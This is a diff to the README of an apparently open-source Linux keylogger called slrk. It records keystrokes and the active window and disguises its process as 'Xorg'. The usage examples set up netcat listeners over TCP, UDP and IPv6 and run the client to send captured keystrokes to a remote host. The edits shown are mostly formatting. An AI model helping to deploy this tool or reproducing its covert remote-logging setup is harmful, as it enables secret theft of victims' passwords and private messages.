@@ -1,5 +1,6 @@
 # Simple_Local&Remote_Keylogger
 
+DESCRIPTION:<br><br>
 Simple keylogger that runs on Linux.<br>
 It must be run as root.
 
@@ -15,14 +16,15 @@ EXAMPLE:<br><br>
 ---It works with both TCP and UDP---<br><br>
 [TCP]<br>
 Server$ nc -lvp 8888 > logger.txt<br>
-Client#./slrk -m remote -a 127.0.0.1 -p 8888<br>
-[UDP]
+Client#./slrk -m remote -a 127.0.0.1 -p 8888<br><br>
+[UDP] <br>
 Server$ nc -u -lvp 8888 > logger.txt<br>
-Client#./slrk -m remote -a 127.0.0.1 -p 8888<br>
+Client#./slrk -m remote -a 127.0.0.1 -p 8888<br><br>
 ---It works with ipv6 too--- <br><br>
 Server$ nc -6 -lvp 8888 > logger.txt<br>
 Client#./slrk -m remote -a ::1 -p 8888
 __________________________________________________________________________
 <br>(It shows the active window on which the target is writing)
-<br>(Keys are mapped on English keyboard)<br>
+<br>(Keys are mapped on English keyboard)
+<br>(It shows the keyboard layout (e.g.: us, it, colemak, etc..))  
 (Process name is renamed as "Xorg")
